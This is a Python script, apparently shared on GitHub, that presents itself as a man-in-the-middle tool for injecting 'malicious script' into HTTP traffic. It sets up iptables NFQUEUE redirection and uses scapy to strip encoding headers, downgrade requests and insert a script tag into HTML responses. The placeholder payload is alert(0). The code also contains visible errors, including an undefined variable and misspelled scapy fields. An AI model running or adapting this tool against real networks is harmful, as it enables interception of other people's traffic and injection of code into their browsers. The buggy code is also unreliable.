#!/usr/bin/env python
#
# sudo iptables -I FORWARD  -j NFQUEUE --queue-num  0
# sudo iptables --flush
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -t wlan0/nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#
# python code to inject malicious script as man in middle
# This code needs two dependencies: netfilterqueue and scapy which is available on python 2.7
# You need a linux system
# for more documentation visit my github page: github.com/nibrasmuhamed
# pull requests, always welcome
# code published under MIT LICENSE
#			
# 				code contributed by: @nibrasmuhamed and @muhammednahil on Github


import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].chksums
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.RAW].load
		if scapy_packet[scapy.TCP].dport == 10000:
			print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			load = load.replace("HTTP/1.1", "HTTP/1.0")

		elif scapy_packet[scapy.TCP].sport == 10000:
			print("[+] Response")
			print(scapy_packet.show())
			injection_code = "<script>alert(0);</script>"
			load = load.replace("</body>",injection_code + "</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))

		if load != scapy_packet[scapy.RAW].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()